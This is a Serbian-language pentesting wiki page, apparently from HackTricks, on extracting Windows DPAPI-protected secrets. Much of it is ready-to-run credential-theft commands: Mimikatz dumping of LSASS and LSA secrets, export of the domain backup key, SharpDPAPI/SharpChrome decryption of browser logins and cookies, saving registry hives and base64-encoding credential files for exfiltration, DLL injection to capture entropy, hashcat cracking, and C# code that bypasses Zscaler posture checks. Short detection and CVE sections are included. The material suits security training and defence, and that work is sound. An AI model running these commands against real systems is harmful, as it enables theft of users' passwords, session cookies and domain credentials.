# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## Šta je DPAPI

Data Protection API (DPAPI) se prvenstveno koristi u operativnom sistemu Windows za **simetrično šifrovanje asimetričnih privatnih ključeva**, pri čemu se korisničke ili sistemske tajne koriste kao značajan izvor entropije. Ovaj pristup pojednostavljuje šifrovanje za programere tako što im omogućava da šifruju podatke ključem izvedenim iz korisničkih tajni za prijavu ili, u slučaju sistemskog šifrovanja, iz sistemskih tajni za autentifikaciju na domenu. Time programeri ne moraju sami da upravljaju zaštitom ključa za šifrovanje.

DPAPI se najčešće koristi pomoću funkcija **`CryptProtectData` i `CryptUnprotectData`**, koje aplikacijama omogućavaju da šifruju i dešifruju podatke koristeći bezbednosni kontekst trenutno prijavljenog procesa. Podrazumevano, podatke može da dešifruje samo isti korisnik ili sistemski kontekst koji ih je šifrovao.<sup>[[2]](#references)[[3]](#references)</sup>

Ove funkcije prihvataju i opcioni **parametar entropije** koji se koristi tokom šifrovanja i dešifrovanja. Za dešifrovanje podataka zaštićenih opcionom entropijom potrebna je ista vrednost entropije.<sup>[[2]](#references)[[6]](#references)</sup>

### Generisanje korisničkog ključa

DPAPI izvodi vrednost specifičnu za korisnika (često se naziva **pre-key**) iz korisničkih akreditiva. Tačan postupak izvođenja zavisi od naloga i verzije operativnog sistema. Na primer, Impacket koristi HMAC-SHA1 putanju zasnovanu na SHA-1 digestu lozinke u UTF-16LE formatu, drugu putanju zasnovanu na MD4/NT hash-u lozinke i putanju izvedenu pomoću PBKDF2-SHA256 za Protected Users. Zato offline alati često mogu da izvedu potreban materijal iz lozinke u čistom tekstu ili dostupnog NT hash-a.<sup>[[2]](#references)[[10]](#references)</sup>

Ovo je posebno zanimljivo jer, ako napadač pribavi korisnički hash lozinke, može da:

- **Dešifruje sve podatke šifrovane pomoću DPAPI-ja** korisnikovim ključem, bez potrebe za kontaktiranjem bilo kog API-ja
- Pokuša da **razbije lozinku** offline, pokušavajući da generiše ispravan DPAPI ključ

DPAPI održava jedan ili više **master keys** za svakog korisnika, umesto da pravi novi master key za svaki zaštićeni blob. Svaki master key ima **GUID** (Globally Unique Identifier), a šifrovani blob beleži koji master key ga štiti.<sup>[[2]](#references)</sup>

Master keys se čuvaju u direktorijumu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gde je `{SID}` korisnikov Security Identifier. Datoteka master key-a sadrži materijal zaštićen korisnikovim **pre-key**-em i, za korisnike domena, materijal za oporavak zaštićen **domain backup key**-em.<sup>[[2]](#references)</sup>

Imajte na umu da se **domain key koji se koristi za šifrovanje master key-a nalazi na kontrolerima domena i nikada se ne menja**, pa ako napadač ima pristup kontroleru domena, može da preuzme domain backup key i dešifruje master keys svih korisnika u domenu.<sup>[[2]](#references)</sup>

Šifrovani blob-ovi u zaglavljima sadrže **GUID master key-a** koji je korišćen za šifrovanje podataka.

> [!TIP]
> DPAPI šifrovani blob-ovi počinju sa **`01 00 00 00`**

Pronađite master keys:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

This ovako izgleda kada korisnik ima više Master Keys:

![Šta je DPAPI - Generisanje korisničkih ključeva: Ovako izgleda kada korisnik ima više Master Keys](<../../images/image (1121).png>)

### Generisanje Machine/System ključa

Ovaj ključ mašina koristi za šifrovanje podataka. Zasnovan je na **DPAPI_SYSTEM LSA secret-u**, posebnom ključu kojem može da pristupi samo SYSTEM korisnik. Ovaj ključ se koristi za šifrovanje podataka kojima sistem mora sam da može da pristupi, kao što su akreditivi na nivou mašine ili tajne dostupne celom sistemu.<sup>[[2]](#references)</sup>

Imajte na umu da ovi ključevi **nemaju domain backup**, pa su dostupni samo lokalno:

- **Mimikatz** može da im pristupi izlistavanjem LSA secrets pomoću komande: `mimikatz lsadump::secrets`
- Tajna se čuva u registru, pa administrator može da **izmeni DACL dozvole da bi joj pristupio**. Putanja u registru je: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Moguće je i offline izdvajanje iz registry hives. Na primer, kao administrator na ciljnom sistemu, sačuvajte hives i exfiltrirajte ih:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

Zatim na svojoj mašini za analizu izvuci LSA tajnu DPAPI_SYSTEM iz hive-ova i upotrebi je za dešifrovanje DPAPI blobova u opsegu mašine (na primer, akreditiva aplikacija zaštićenih na nivou mašine ili Wi-Fi profila):

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Veeam-specific DPAPI primer:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Podaci zaštićeni pomoću DPAPI-ja

Lični podaci koje štiti DPAPI obuhvataju:

- Windows akreditive
- Lozinke i podatke za automatsko popunjavanje u pregledačima Internet Explorer i Google Chrome
- Lozinke za e-poštu i interne FTP naloge u aplikacijama kao što su Outlook i Windows Mail
- Lozinke za deljene fascikle, resurse, bežične mreže i Windows Vault, uključujući ključeve za šifrovanje
- Lozinke za veze sa udaljenom radnom površinom, .NET Passport i privatne ključeve za različite namene šifrovanja i autentifikacije
- Mrežne lozinke kojima upravlja Credential Manager i lični podaci u aplikacijama koje koriste CryptProtectData, kao što su Skype, MSN messenger i druge
- Šifrovani blobovi u registru
- ...

Sistemski zaštićeni podaci obuhvataju:
- Wi-Fi lozinke
- ...

Lozinke za zakazane zadatke zasebno su pitanje LSA tajni. Zadatak registrovan pomoću [Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) može da sačuva lozinku za oporavak lokalnog administratora/SYSTEM naloga; S4U zadatak ili zadatak koji koristi interaktivni token ne potvrđuje da je lozinka sačuvana. Principal i tip prijavljivanja zadatka pouzdaniji su pokazatelji od samog naziva naloga pod kojim se izvršava.

### Opcije za izdvajanje glavnog ključa

- Ako korisnik ima privilegije domain admin-a, može da pristupi **domain backup key** ključu za dešifrovanje svih glavnih ključeva korisnika u domenu:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- Uz privilegije lokalnog administratora, moguće je **pristupiti memoriji LSASS-a** i izvući DPAPI glavne ključeve svih povezanih korisnika i SYSTEM ključ.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- Ako korisnik ima lokalne administratorske privilegije, može da pristupi **DPAPI_SYSTEM LSA secret** i dešifruje master ključeve mašine:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- Ako su poznati lozinka ili NTLM hash korisnika, možete direktno **dešifrovati glavne ključeve korisnika**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- Ako ste u sesiji kao korisnik, moguće je zatražiti od DC-a **backup key za dešifrovanje master keys pomoću RPC-a**. Ako ste local admin i korisnik je prijavljen, možete **ukrasti njegov session token**:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Izlistavanje Vault-a

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## Pristup DPAPI-enkriptovanim podacima

### Pronalaženje DPAPI-enkriptovanih podataka

Datoteke korisnika koje su obično zaštićene nalaze se u:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Proverite i putanje iznad tako što ćete zameniti `\Roaming\` sa `\Local\`.

Primeri enumeracije:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) može da pronađe DPAPI-jem šifrovane blobs u sistemu datoteka, registru i B64 blobs:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

Imajte na umu da se [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (iz istog repozitorijuma) može koristiti za dešifrovanje osetljivih podataka kao što su cookies pomoću DPAPI-ja.<sup>[[12]](#references)</sup>

#### Brzi recepti za Chromium/Edge/Electron (SharpChrome)

- Trenutni korisnik, interaktivno dešifrovanje sačuvanih prijava/cookies (radi čak i sa app-bound cookies u Chrome 127+ jer se dodatni ključ razrešava iz Credential Manager-a korisnika pri pokretanju u kontekstu korisnika):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- Offline analiza kada imate samo fajlove. Prvo izvucite AES ključ stanja iz fajla profila „Local State“, a zatim ga upotrebite za dešifrovanje baze kolačića:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- Triage na nivou domena/udaljeni triage kada imate DPAPI ključ za rezervnu kopiju domena (PVK) i admin pristup ciljnom hostu:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- Ako imate korisnikov DPAPI prekey/credkey (iz LSASS-a), možete da preskočite razbijanje lozinke i direktno dešifrujete podatke profila:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Beleške
- Novije verzije Chrome/Edge-a mogu da čuvaju određene kolačiće koristeći šifrovanje „App-Bound“. Dešifrovanje tih konkretnih kolačića van mreže nije moguće bez dodatnog ključa vezanog za aplikaciju; pokrenite SharpChrome u kontekstu ciljanog korisnika da biste ga automatski preuzeli. Pogledajte objavu na Chrome-ovom bezbednosnom blogu navedenu ispod.<sup>[[5]](#references)</sup>

### Pristupni ključevi i podaci

- **Koristite SharpDPAPI** da biste preuzeli akreditive iz DPAPI šifrovanih datoteka iz trenutne sesije:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **Pribavite podatke o akreditivima** poput šifrovanih podataka i guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **Pristup masterkeys**:

Dešifrujte masterkey korisnika tako što ćete putem RPC-a zatražiti **domain backup key**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

Alat **SharpDPAPI** takođe podržava ove argumente za dešifrovanje masterkey-a (imajte na umu da je moguće koristiti `/rpc` za preuzimanje backup key-a domena, `/password` za korišćenje lozinke u čistom tekstu ili `/pvk` za navođenje datoteke sa privatnim ključem DPAPI domena...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **Dekriptovanje podataka pomoću masterkey-a**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

Alat **SharpDPAPI** takođe podržava ove argumente za dešifrovanje `credentials|vaults|rdg|keepass|triage|blob|ps` (imajte na umu da je moguće koristiti `/rpc` za preuzimanje rezervnog ključa domena, `/password` za korišćenje lozinke u čistom tekstu, `/pvk` za navođenje datoteke privatnog ključa DPAPI domena, `/unprotect` za korišćenje sesije trenutnog korisnika...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- Direktno korišćenje DPAPI prekey/credkey (lozinka nije potrebna)

Ako možeš da dump-uješ LSASS, Mimikatz često otkriva DPAPI ključ za svaku prijavu, koji može da se koristi za dešifrovanje korisnikovih masterkeys bez poznavanja lozinke u plaintext obliku. Prosledi ovu vrednost direktno alatima:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- Dešifrujte neke podatke pomoću **sesije trenutnog korisnika**:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Offline dešifrovanje pomoću Impacket dpapi.py

Ako imate SID i lozinku korisnika žrtve (ili NT hash), možete u potpunosti offline da dešifrujete DPAPI masterkeys i Credential Manager blob-ove pomoću Impacket-ovog dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Identifikujte artefakte na disku:
  - Credential Manager blob(ove): %APPDATA%\Microsoft\Credentials\<hex>
  - Odgovarajući masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Ako je alat za prenos datoteka nepouzdan, kodirajte datoteke u base64 na hostu i kopirajte izlaz:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- Dešifruj masterkey koristeći SID i lozinku/hash korisnika:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- Upotrebite dekriptovani masterkey da dekriptujete credential blob:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

Ovaj tok rada često oporavlja domenske akreditive koje su aplikacije sačuvale pomoću Windows Credential Manager-a, uključujući administratorske naloge (npr. `*_adm`).

---

### Rukovanje opcionom entropijom („Third-party entropy“)

Neke aplikacije prosleđuju dodatnu vrednost **entropije** funkciji `CryptProtectData`. Bez ove vrednosti blob se ne može dešifrovati, čak ni ako je poznat ispravan masterkey. Zato je pribavljanje entropije neophodno pri ciljanju akreditiva zaštićenih na ovaj način (npr. Microsoft Outlook i neki VPN klijenti).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) je DLL u korisničkom režimu koji postavlja hook-ove na DPAPI funkcije unutar ciljnog procesa i transparentno beleži svaku prosleđenu opcionu entropiju. Pokretanjem EntropyCapture-a u režimu **DLL-injection** nad procesima kao što su `outlook.exe` ili `vpnclient.exe` dobiće se izlazna datoteka koja mapira svaki bafer entropije na pozivajući proces i blob. Uhvaćena entropija se kasnije može proslediti alatki **SharpDPAPI** (`/entropy:`) ili **Mimikatz** (`/entropy:<file>`) radi dešifrovanja podataka.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Offline razbijanje masterkey-a (Hashcat & DPAPISnoop)

Microsoft je uveo format masterkey-a **context 3** počevši od Windows 10 v1607 (2016). `hashcat` v6.2.6 (decembar 2023) dodao je hash-mode-ove **22100** (DPAPI masterkey v1 context), **22101** (context 1) i **22102** (context 3), koji omogućavaju GPU-ubrzano razbijanje korisničkih lozinki direktno iz masterkey fajla. Napadači zato mogu da izvode word-list ili brute-force napade bez interakcije sa ciljnim sistemom.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automatizuje ovaj proces:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

Alat može i da parsira Credential i Vault blobove, dešifruje ih pomoću razbijenih ključeva i izveze lozinke u čistom tekstu.<sup>[[8]](#references)</sup>


### Pristup podacima drugih mašina

U **SharpDPAPI i SharpChrome** možete navesti opciju **`/server:HOST`** da biste pristupili podacima udaljene mašine. Naravno, morate imati pristup toj mašini, a u sledećem primeru pretpostavlja se da je **poznat ključ za šifrovanje rezervne kopije domena**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

## Ostali alati

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) je alat koji automatizuje izdvajanje svih korisnika i računara iz LDAP direktorijuma i izdvajanje rezervnog ključa kontrolera domena putem RPC-a. Skripta zatim pronalazi IP adrese svih računara i pokreće smbclient na svakom računaru kako bi preuzela sve DPAPI blobove svih korisnika i dešifrovala ih pomoću rezervnog ključa domena.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Pomoću liste računara izdvojene iz LDAP-a možete pronaći svaku podmrežu, čak i ako za nju niste znali!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) može automatski da dump-uje tajne zaštićene pomoću DPAPI-ja. Izdanje 2.x uvelo je:<sup>[[9]](#references)</sup>

* Paralelno prikupljanje blobova sa stotina hostova
* Parsiranje masterkey-ja **konteksta 3** i automatsku integraciju za Hashcat cracking
* Podršku za Chrome kolačiće šifrovane pomoću „App-Bound“ (pogledajte sledeći odeljak)
* Novi režim **`--snapshot`** za ponovljeno proveravanje krajnjih tačaka i poređenje novokreiranih blobova

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) je C# parser za masterkey/credential/vault datoteke koji može da generiše formate za Hashcat/JtR i po izboru automatski pokrene cracking. U potpunosti podržava formate masterkey-ja za mašine i korisnike do Windows 11 24H1.<sup>[[8]](#references)</sup>


## Uobičajeni načini detekcije

- Pristup datotekama u `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i drugim direktorijumima povezanim sa DPAPI-jem.
    - Naročito preko mrežnog deljenja kao što su **C$** ili **ADMIN$**.
- Upotreba alata **Mimikatz**, **SharpDPAPI** ili sličnih alata za pristup LSASS memoriji ili dump-ovanje masterkey-ja.
- Događaj **4662**: *Operacija je izvršena nad objektom* – može se povezati sa pristupom objektu **`BCKUPKEY`**.
- Događaj **4673/4674** kada proces zatraži *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Ranjivosti i promene u ekosistemu 2023–2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembar 2023). Napadač sa mrežnim pristupom mogao je da prevari člana domena da preuzme zlonamerni rezervni ključ DPAPI-ja, čime bi se omogućilo dešifrovanje masterkey-ja korisnika. Ispravljeno je kumulativnim ažuriranjem iz novembra 2023. – administratori treba da obezbede da su kontroleri domena i radne stanice u potpunosti ažurirani.<sup>[[4]](#references)</sup>
* **Chrome 127 „App-Bound“ šifrovanje kolačića** (jul 2024) zamenilo je staru zaštitu koja se oslanjala samo na DPAPI dodatnim ključem sačuvanim u **Credential Manager** korisnika. Za offline dešifrovanje kolačića sada su potrebni i DPAPI masterkey i **GCM-wrapped app-bound key**. SharpChrome v2.3 i DonPAPI 2.x mogu da dohvate dodatni ključ kada se pokreću u kontekstu korisnika.<sup>[[5]](#references)</sup>


### Studija slučaja: Zscaler Client Connector – prilagođena entropija izvedena iz SID-a

Zscaler Client Connector čuva nekoliko konfiguracionih datoteka u `C:\ProgramData\Zscaler` (npr. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Svaka datoteka je šifrovana pomoću **DPAPI-ja (opseg mašine)**, ali dobavljač obezbeđuje **prilagođenu entropiju** koja se *izračunava tokom izvršavanja*, umesto da bude sačuvana na disku.<sup>[[1]](#references)</sup>

Entropija se ponovo sastavlja od dva elementa:

1. Tajna vrednost upisana u `ZSACredentialProvider.dll`.
2. **SID** Windows naloga kojem pripada konfiguracija.

Algoritam implementiran u DLL-u ekvivalentan je sledećem:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

Pošto je tajna ugrađena u DLL koji se može pročitati sa diska, **svaki lokalni napadač sa SYSTEM privilegijama može ponovo da generiše entropiju za bilo koji SID** i da dešifruje blobove van mreže:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

Dešifrovanje otkriva kompletnu JSON konfiguraciju, uključujući svaku **proveru stanja uređaja** i očekivanu vrednost – informacije koje su veoma korisne pri pokušajima zaobilaženja na strani klijenta.

> SAVET: drugi šifrovani artefakti (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) zaštićeni su DPAPI-jem **bez** entropije (`16` nultih bajtova). Zato se mogu direktno dešifrovati pomoću `ProtectedData.Unprotect` kada se pribave SYSTEM privilegije.

## References

- [1] [Synacktiv – Da li treba verovati svom zero trust-u? Zaobilaženje Zscaler provera stanja](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI tajne. Bezbednosna analiza i oporavak podataka u DPAPI-ju](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Čitanje DPAPI šifrovanih tajni pomoću Mimikatz-a i C++-a](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) ranjivost lažiranja](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Poboljšanje bezbednosti Chrome kolačića u Windows-u](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: jednostavno izdvajanje opcione DPAPI entropije](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Napomene o izdanju hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repozitorijum](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI stranica projekta](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: zloupotreba AD ACL-ova, probijanje KeePassXC Argon2 hash-a i DPAPI dešifrovanje do administratorskog pristupa DC-u](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – upotreba i opcije](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
